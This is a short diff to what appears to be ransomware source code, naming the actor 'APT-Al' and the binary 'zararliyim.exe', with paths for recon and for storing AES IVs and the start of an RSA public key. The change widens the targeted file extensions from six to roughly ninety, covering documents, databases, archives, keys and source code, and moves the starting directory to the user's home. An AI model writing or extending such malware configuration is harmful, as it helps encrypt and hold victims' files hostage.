@@ -7,8 +7,8 @@ whoweare = "APT-Al"
 whatismyname = "zararliyim.exe"
 
 # the beginning point of recon
-# root_directory = os.path.expanduser('~')
-root_directory = "/home/kali/test"
+root_directory = os.path.expanduser('~')
+root_directory = os.path.join(root_directory,"test")
 
 # where to write the pairs made up of a file and AES IV
 aesIV-File_store_path = "/home/kali/desktop"
@@ -18,7 +18,19 @@ os_name = os.name
 
 
 # the extensions are ordered so we can use binary search
-file_extentions = ['doc', 'exe', 'jpg', 'png', 'txt', 'xlsx']
+file_extentions = [ '7z', 'ai', 'aif', 'apk', 'arj', 'asp', 'aspx', 'avi', 
+                    'bak', 'bat', 'bin', 'bmp', 'c', 'cab', 'cda', 'cfg', 
+                    'cgi', 'class', 'cpp', 'cs', 'css', 'csv', 'dat', 'db', 
+                    'dbf', 'deb', 'dmg', 'doc', 'docx', 'eml', 'exe', 'fnt', 
+                    'fon', 'htm', 'html', 'ico', 'iso', 'jar', 'java', 'jpeg', 
+                    'jpg', 'js', 'json', 'jsp', 'key', 'log', 'mdb', 'mid', 'midi', 
+                    'mov', 'mp3', 'mp4', 'mpa', 'mpg', 'msg', 'msi', 'odp', 
+                    'ods', 'oft', 'ogg', 'ost', 'pdf', 'php', 'pkg', 'pl', 
+                    'png', 'pps', 'ppt', 'pptx', 'py', 'rar', 'rpm', 'rss', 
+                    'rtf', 'sh', 'sql', 'svg', 'swift', 'sys', 'tar', 'tif', 
+                    'tiff', 'toast', 'vb', 'wav', 'wma', 'wpl', 'wsf', 'xhtml', 
+                    'xls', 'xml', 'xslm', 'xslx', 'zip']
+
 
 
 rsa_public_key = "-----BEGIN RSA PUBLIC KEY-----\n\
